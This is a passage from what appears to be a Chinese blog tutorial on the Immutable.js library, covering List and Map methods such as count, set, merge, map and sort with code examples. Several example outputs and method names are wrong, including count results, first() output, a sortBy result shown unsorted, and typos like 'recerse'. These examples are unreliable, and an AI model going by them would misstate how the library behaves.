id="二、toJS"><a href="#二、toJS" class="headerlink" title="二、toJS"></a>二、toJS</h2><ul><li>作用：将一个<code>Immutable</code>数据转换为<code>JS</code>类型的数据</li><li>用法：<code>value.toJS()</code></li></ul><h2 id="三、is"><a href="#三、is" class="headerlink" title="三、is"></a>三、is</h2><ul><li>作用：对两个对象进行比较</li><li>用法：<code>is(map1,map2)</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="built_in">Map</span>, is &#125; <span class="keyword">from</span> <span class="string">'immutable'</span></span><br><span class="line"><span class="keyword">const</span> map1 = <span class="built_in">Map</span>(&#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">1</span>, <span class="attr">c</span>: <span class="number">1</span> &#125;)</span><br><span class="line"><span class="keyword">const</span> map2 = <span class="built_in">Map</span>(&#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">1</span>, <span class="attr">c</span>: <span class="number">1</span> &#125;)</span><br><span class="line"></span><br><span class="line">map1 === map2   <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.is(map1, map2) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">is(map1, map2) <span class="comment">//  true 只检测值是否相等</span></span><br></pre></td></tr></table></figure><h2 id="四、List-和-Map"><a href="#四、List-和-Map" class="headerlink" title="四、List 和 Map"></a>四、List 和 Map</h2><h3 id="4-1-创建"><a href="#4-1-创建" class="headerlink" title="4.1 创建"></a>4.1 创建</h3><ul><li><code>List</code> 有序索引密集的集合，和<code>JS</code>中的<code>Array</code>很像 </li><li><code>Map</code> 无序索引集，类似<code>JavaScript</code>中的<code>Object</code></li></ul><h3 id="4-2-判断"><a href="#4-2-判断" class="headerlink" title="4.2 判断"></a>4.2 判断</h3><ul><li><code>List.isList()</code> 和 <code>Map.isMap()</code> 判断一个数据结构是不是<code>List/Map</code>类型</li></ul><h3 id="4-3-长度"><a href="#4-3-长度" class="headerlink" title="4.3 长度"></a>4.3 长度</h3><h4 id="4-3-1-size-获取List-Map的长度"><a href="#4-3-1-size-获取List-Map的长度" class="headerlink" title="4.3.1 size 获取List/Map的长度**"></a>4.3.1 <code>size</code> 获取<code>List/Map</code>的长度**</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// list</span></span><br><span class="line"><span class="built_in">console</span>.log(List([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).size);<span class="comment">// 4</span></span><br><span class="line"><span class="built_in">console</span>.log(List.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>).size);<span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// map</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Map</span>(&#123;<span class="attr">key</span>: <span class="string">"value2"</span>, <span class="attr">key1</span>: <span class="string">"value1"</span>&#125;).size);<span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Map</span>.of(&#123;<span class="attr">x</span>:<span class="number">1</span>&#125;, <span class="number">2</span>, [<span class="number">3</span>], <span class="number">4</span>).size);<span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h4 id="4-3-2-count"><a href="#4-3-2-count" class="headerlink" title="4.3.2 count()"></a>4.3.2 count()</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// map</span></span><br><span class="line"><span class="built_in">console</span>.log(Immutable.fromJS(&#123;<span class="attr">key</span>: <span class="string">"value2"</span>, <span class="attr">key1</span>: <span class="string">"value1"</span>&#125;).count());<span class="comment">// 4</span></span><br><span class="line"><span class="comment">// 可以定制条件，来确定大小</span></span><br><span class="line"><span class="built_in">console</span>.log(Immutable.fromJS(&#123;<span class="attr">key</span>: <span class="number">1</span>, <span class="attr">key1</span>: <span class="number">34</span>&#125;).count(<span class="function">(<span class="params">value, key, obj</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> value &gt; <span class="number">3</span>;</span><br><span class="line">&#125;));<span class="comment">// 1 value大于3的有两个</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// list</span></span><br><span class="line"><span class="built_in">console</span>.log(Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>]).count());<span class="comment">// 4</span></span><br><span class="line"><span class="comment">// 可以制定条件，来确定 大小</span></span><br><span class="line"><span class="built_in">console</span>.log(Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>]).count(<span class="function">(<span class="params">value, index, array</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> value &gt; <span class="number">3</span>;</span><br><span class="line">&#125;));<span class="comment">// 2 大于3的有两个</span></span><br></pre></td></tr></table></figure><h3 id="4-4-数据读取"><a href="#4-4-数据读取" class="headerlink" title="4.4 数据读取"></a>4.4 数据读取</h3><h4 id="4-4-1-get-、-getIn"><a href="#4-4-1-get-、-getIn" class="headerlink" title="4.4.1 get() 、 getIn()"></a>4.4.1 <code>get() 、 getIn()</code></h4><blockquote><p>获取数据结构中的数据</p></blockquote><h4 id="4-4-2-has-、-hasIn"><a href="#4-4-2-has-、-hasIn" class="headerlink" title="4.4.2 has() 、 hasIn()"></a>4.4.2 <code>has() 、 hasIn()</code></h4><blockquote><p>判断是否存在某一个<code>key</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;]).has(<span class="string">'0'</span>); <span class="comment">//true</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;]).has(<span class="string">'0'</span>); <span class="comment">//true</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;]).hasIn([<span class="number">3</span>,<span class="string">'b'</span>]) <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h4 id="4-4-3-includes"><a href="#4-4-3-includes" class="headerlink" title="4.4.3 includes()"></a>4.4.3 <code>includes()</code></h4><blockquote><p>判断是否存在某一个<code>value</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;]).includes(<span class="number">2</span>); <span class="comment">//true</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;]).includes(<span class="string">'2'</span>); <span class="comment">//false 不包含字符2</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;]).includes(<span class="number">5</span>); <span class="comment">//false </span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;]).includes(&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;) <span class="comment">//false</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;]).includes(Immutable.fromJS(&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;)) <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h4 id="4-4-4-first-、-last"><a href="#4-4-4-first-、-last" class="headerlink" title="4.4.4 first() 、 last()"></a>4.4.4 <code>first() 、 last()</code></h4><blockquote><p>用来获取第一个元素或者最后一个元素，若没有则返回<code>undefined</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;]).first()<span class="comment">//1</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#123;<span class="attr">a</span>:<span class="number">4</span>,<span class="attr">b</span>:<span class="number">5</span>&#125;]).last()<span class="comment">//&#123;a:4,b:5&#125;</span></span><br><span class="line"></span><br><span class="line">Immutable.fromJS(&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>,<span class="attr">c</span>:&#123;<span class="attr">d</span>:<span class="number">3</span>,<span class="attr">e</span>:<span class="number">4</span>&#125;&#125;).first() <span class="comment">//1</span></span><br><span class="line">Immutable.fromJS(&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>,<span class="attr">c</span>:&#123;<span class="attr">d</span>:<span class="number">3</span>,<span class="attr">e</span>:<span class="number">4</span>&#125;&#125;).first() <span class="comment">//&#123;d:3,e:4&#125;</span></span><br></pre></td></tr></table></figure><h3 id="4-5-数据修改"><a href="#4-5-数据修改" class="headerlink" title="4.5 数据修改"></a>4.5 数据修改</h3><h4 id="4-5-1-set"><a href="#4-5-1-set" class="headerlink" title="4.5.1 set()"></a>4.5.1 <code>set()</code></h4><blockquote><p>设置第一层<code>key</code>、<code>index</code>的值</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="built_in">Map</span></span><br><span class="line"><span class="comment">// 将 key 位置的元素替换为 value</span></span><br><span class="line"><span class="keyword">const</span> $obj1 = <span class="built_in">Map</span>(&#123;<span class="attr">a</span>: &#123;<span class="attr">a1</span>: <span class="number">34</span>&#125;, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span>, <span class="attr">d</span>: <span class="number">444</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log($obj1.set(<span class="string">'a'</span>, <span class="number">0</span>).toJS()); <span class="comment">// &#123;a: 0, b: 2, c: 3, d: 444&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log($obj1.set(<span class="string">'e'</span>, <span class="number">99</span>).toJS());  <span class="comment">// &#123;a: 1, b: 2, c: 3, d: 444, e: 99&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// List</span></span><br><span class="line"><span class="comment">// 将 index 位置的元素替换为 value，即使索引越界也是安全的, 空位 undefined</span></span><br><span class="line"><span class="keyword">const</span> $arr1 = List([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="built_in">console</span>.log($arr1.set(<span class="number">-1</span>, <span class="number">0</span>).toJS()); <span class="comment">// [1, 2, 0]  注意-1 等效于 $arr1.set($arr1.size + -1, 0)</span></span><br><span class="line"><span class="built_in">console</span>.log($arr1.set(<span class="number">4</span>, <span class="number">0</span>).toJS());  <span class="comment">// [ 1, 2, 3, undefined, 0 ]  空位置为了undefined</span></span><br></pre></td></tr></table></figure><h4 id="4-5-2-setIn"><a href="#4-5-2-setIn" class="headerlink" title="4.5.2 setIn()"></a>4.5.2 <code>setIn()</code></h4><blockquote><p>设置深层结构中某属性的值</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Map</span></span><br><span class="line"><span class="built_in">console</span>.log(Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, &#123;<span class="attr">a</span>: <span class="number">45</span>, <span class="attr">b</span>: <span class="number">64</span>&#125;]).setIn([<span class="string">'3'</span>, <span class="string">'a'</span>], <span class="number">1000</span>).toJS());<span class="comment">//[1, 2, 3, &#123;a: 1000, b: 64&#125;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// List</span></span><br><span class="line"><span class="built_in">console</span>.log(Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, &#123;<span class="attr">a</span>: <span class="number">45</span>, <span class="attr">b</span>: <span class="number">64</span>&#125;]).setIn([<span class="string">'3'</span>, <span class="string">'a'</span>], <span class="number">1000</span>).toJS());<span class="comment">//[1, 2, 3, &#123;a: 1000, b: 64&#125;]</span></span><br></pre></td></tr></table></figure><h4 id="4-5-3-deleteIn"><a href="#4-5-3-deleteIn" class="headerlink" title="4.5.3 deleteIn()"></a>4.5.3 <code>deleteIn()</code></h4><blockquote><p>用来删除深层数据，用法参考<code>setIn</code></p></blockquote><h4 id="4-5-4-更新-update"><a href="#4-5-4-更新-update" class="headerlink" title="4.5.4 更新 update()"></a>4.5.4 <code>更新 update()</code></h4><blockquote><p>对对象中的某个属性进行更新，可对原数据进行相关操作</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////List</span></span><br><span class="line"><span class="keyword">const</span> list = List([ <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span> ])</span><br><span class="line"><span class="keyword">const</span> result = list.update(<span class="number">2</span>, val =&gt; val.toUpperCase())</span><br><span class="line"></span><br><span class="line"><span class="comment">///Map</span></span><br><span class="line"><span class="keyword">const</span> aMap = <span class="built_in">Map</span>(&#123; <span class="attr">key</span>: <span class="string">'value'</span> &#125;)</span><br><span class="line"><span class="keyword">const</span> newMap = aMap.update(<span class="string">'key'</span>, value =&gt; value + value)</span><br></pre></td></tr></table></figure><h4 id="4-5-5-clear"><a href="#4-5-5-clear" class="headerlink" title="4.5.5 clear()"></a>4.5.5 <code>clear()</code></h4><blockquote><p>清除所有数据</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Map</span>(&#123; <span class="attr">key</span>: <span class="string">'value'</span> &#125;).clear()  <span class="comment">//Map</span></span><br><span class="line">List([ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> ]).clear()   <span class="comment">// List</span></span><br></pre></td></tr></table></figure><h3 id="4-6-List中的删除与插入"><a href="#4-6-List中的删除与插入" class="headerlink" title="4.6 List中的删除与插入"></a>4.6 List中的删除与插入</h3><h4 id="4-6-1-数组方法"><a href="#4-6-1-数组方法" class="headerlink" title="4.6.1 数组方法"></a>4.6.1 数组方法</h4><blockquote><p><code>List</code>对应的数据结构是<code>js</code>中的数组，所以数组的一些方法在<code>Immutable</code>中也是通用的，比如<code>push</code>，<code>pop</code>,<code>shift</code>，<code>unshift</code>，<code>insert</code></p></blockquote><ul><li><code>push()</code>：在<code>List</code>末尾插入一个元素</li><li><code>pop()</code>: 在<code>List</code>末尾删除一个元素</li><li><code>unshift</code>: 在<code>List</code>首部插入一个元素</li><li><code>shift</code>: 在<code>List</code>首部删除一个元素</li><li><code>insert</code>：在<code>List</code>的<code>index</code>处插入元素</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List([ <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> ]).insert(<span class="number">6</span>, <span class="number">5</span>) <span class="comment">//List [ 0, 1, 2, 3, 4, 5 ]</span></span><br><span class="line">List([ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> ]).push(<span class="number">5</span>) <span class="comment">// List [ 1, 2, 3, 4, 5 ]</span></span><br><span class="line">List([ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> ]).pop() <span class="comment">// List[ 1, 2, 3 ]</span></span><br><span class="line">List([ <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).unshift(<span class="number">1</span>) <span class="comment">// List [ 1, 2, 3, 4 ]</span></span><br><span class="line">List([ <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> ]).shift() <span class="comment">// List [ 1, 2, 3, 4 ]</span></span><br></pre></td></tr></table></figure><h3 id="4-7-关于merge"><a href="#4-7-关于merge" class="headerlink" title="4.7 关于merge"></a>4.7 关于merge</h3><ul><li><code>merge</code> 浅合并，新数据与旧数据对比，旧数据中不存在的属性直接添加，旧数据中已存在的属性用新数据中的覆盖</li><li><code>mergrWith</code> 自定义浅合并，可自行设置某些属性的值</li><li><code>mergeIn</code> 对深层数据进行浅合并</li><li><code>mergeDeep</code> 深合并，新旧数据中同时存在的的属性为新旧数据合并之后的数据</li><li><code>mergeDeepIn</code>  对深层数据进行深合并</li><li><code>mergrDeepWith</code>  自定义深合并，可自行设置某些属性的值</li></ul><blockquote><p>这里用一段示例彻底搞懂<code>merge</code>，此示例为<code>Map</code>结构，<code>List</code>与<code>Map</code>原理相同</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Map1 = Immutable.fromJS(&#123;<span class="attr">a</span>:<span class="number">111</span>,<span class="attr">b</span>:<span class="number">222</span>,<span class="attr">c</span>:&#123;<span class="attr">d</span>:<span class="number">333</span>,<span class="attr">e</span>:<span class="number">444</span>&#125;&#125;);</span><br><span class="line"> <span class="keyword">const</span> Map2 = Immutable.fromJS(&#123;<span class="attr">a</span>:<span class="number">111</span>,<span class="attr">b</span>:<span class="number">222</span>,<span class="attr">c</span>:&#123;<span class="attr">e</span>:<span class="number">444</span>,<span class="attr">f</span>:<span class="number">555</span>&#125;&#125;);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">const</span> Map3 = Map1.merge(Map2);</span><br><span class="line">  <span class="comment">//Map &#123;a:111,b:222,c:&#123;e:444,f:555&#125;&#125;</span></span><br><span class="line"> <span class="keyword">const</span> Map4 = Map1.mergeDeep(Map2);</span><br><span class="line">  <span class="comment">//Map &#123;a:111,b:222,c:&#123;d:333,e:444,f:555&#125;&#125;</span></span><br><span class="line"> <span class="keyword">const</span> Map5 = Map1.mergeWith(<span class="function">(<span class="params">oldData,newData,key</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(key === <span class="string">'a'</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> newData</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,Map2);</span><br><span class="line">  <span class="comment">//Map &#123;a:666,b:222,c:&#123;e:444,f:555&#125;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="4-8-序列算法"><a href="#4-8-序列算法" class="headerlink" title="4.8 序列算法"></a>4.8 序列算法</h3><h4 id="4-8-1-concat"><a href="#4-8-1-concat" class="headerlink" title="4.8.1 concat()"></a>4.8.1 <code>concat()</code></h4><blockquote><p>对象的拼接，用法与<code>js</code>数组中的<code>concat()</code>相同，返回一个新的对象</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> List = list1.concat(list2)</span><br></pre></td></tr></table></figure><h4 id="4-8-2-map"><a href="#4-8-2-map" class="headerlink" title="4.8.2 map()"></a>4.8.2 <code>map()</code></h4><blockquote><p>遍历整个对象，对<code>Map/List</code>元素进行操作，返回一个新的对象</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Map</span>(&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;).map(<span class="function"><span class="params">val</span>=&gt;</span><span class="number">10</span>*val)</span><br><span class="line"><span class="comment">//Map&#123;a:10,b:20&#125;</span></span><br></pre></td></tr></table></figure><h4 id="4-8-3-mapKey"><a href="#4-8-3-mapKey" class="headerlink" title="4.8.3 mapKey()"></a>4.8.3 mapKey()</h4><blockquote><p><code>Map</code>特有的<code>mapKey()</code> 遍历整个对象，对<code>Map</code>元素的<code>key</code>进行操作，返回一个新的对象</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Map</span>(&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;).mapKey(<span class="function"><span class="params">val</span>=&gt;</span>val+<span class="string">'l'</span>)</span><br><span class="line"><span class="comment">//Map&#123;al:10,bl:20&#125;</span></span><br></pre></td></tr></table></figure><h4 id="4-8-4-mapEntries"><a href="#4-8-4-mapEntries" class="headerlink" title="4.8.4 mapEntries"></a>4.8.4 mapEntries</h4><blockquote><p><code>Map特有的mapEntries()</code>  遍历整个对象，对<code>Map</code>元素的<code>key</code>和<code>value</code>同时进行操作，返回一个新的对象。<code>Map</code>的<code>map()</code>也可实现此功能</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Map</span>(&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;).map(<span class="function">(<span class="params">key,val</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [key+<span class="string">'l'</span>,val*<span class="number">10</span>]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//Map&#123;al:10,bl:20&#125;</span></span><br></pre></td></tr></table></figure><h4 id="4-8-5-filter"><a href="#4-8-5-filter" class="headerlink" title="4.8.5 filter"></a>4.8.5 filter</h4><blockquote><ul><li><code>过滤 filter</code> 返回一个新的对象，包括所有满足过滤条件的元素</li><li>还有一个<code>filterNot()</code>方法，与此方法正好相反</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Map</span>(&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;).filter(<span class="function">(<span class="params">key,val</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> val == <span class="number">2</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//Map&#123;b:2&#125;</span></span><br></pre></td></tr></table></figure><h4 id="4-8-6-reverse"><a href="#4-8-6-reverse" class="headerlink" title="4.8.6 reverse"></a>4.8.6 reverse</h4><blockquote><p>作用：将数据的结构进行反转</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]).reverse(); <span class="comment">// List [5,4,3,2,1]</span></span><br><span class="line">Immutable.fromJS(&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:&#123;<span class="attr">c</span>:<span class="number">2</span>,<span class="attr">d</span>:<span class="number">3</span>&#125;,<span class="attr">e</span>:<span class="number">4</span>&#125;).recerse();</span><br><span class="line"><span class="comment">//Map &#123;e:4,b:&#123;c:2,d:3&#125;,a:1&#125;</span></span><br></pre></td></tr></table></figure><h4 id="4-8-7-sort-amp-sortBy"><a href="#4-8-7-sort-amp-sortBy" class="headerlink" title="4.8.7 sort &amp; sortBy"></a>4.8.7 sort &amp; sortBy</h4><blockquote><p><code>排序 sort &amp; sortBy</code> 作用：对数据结构进行排序</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///List</span></span><br><span class="line">Immutable.fromJS([<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">1</span>]).sort()</span><br><span class="line"><span class="comment">// List [1,2,3,4,5,6]</span></span><br><span class="line">Immutable.fromJS([<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">1</span>]).sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a &lt; b) &#123; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">  <span class="keyword">if</span> (a &gt; b) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">  <span class="keyword">if</span> (a === b) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// List [1,2,3,4,5,6]</span></span><br><span class="line">Immutable.fromJS([&#123;<span class="attr">a</span>:<span class="number">3</span>&#125;,&#123;<span class="attr">a</span>:<span class="number">2</span>&#125;,&#123;<span class="attr">a</span>:<span class="number">4</span>&#125;,&#123;<span class="attr">a</span>:<span class="number">1</span>&#125;]).sortBy(<span class="function">(<span class="params">val,index,obj</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> val.get(<span class="string">'a'</span>)</span><br><span class="line">&#125;,(a,b)=&gt;&#123;</span><br><span class="line">  <span class="keyword">if</span> (a &lt; b) &#123; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">  <span class="keyword">if</span> (a &gt; b) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">  <span class="keyword">if</span> (a === b) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//List  [ &#123;a:3&#125;, &#123;a:2&#125;, &#123;a:4&#125;, &#123;a:1&#125; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Map</span></span><br><span class="line"></span><br><span class="line">Immutable.fromJS( &#123;<span class="attr">b</span>:<span class="number">1</span>, <span class="attr">a</span>: <span class="number">3</span>, <span class="attr">c</span>: <span class="number">2</span>, <span class="attr">d</span>:<span class="number">5</span>&#125; ).sort()</span><br><span class="line"><span class="comment">//Map &#123;b: 1, c: 2, a: 3, d: 5&#125;</span></span><br><span class="line">Immutable.fromJS( &#123;<span class="attr">b</span>:<span class="number">1</span>, <span class="attr">a</span>: <span class="number">3</span>, <span class="attr">c</span>: <span class="number">2</span>, <span class="attr">d</span>:<span class="number">5</span>&#125; 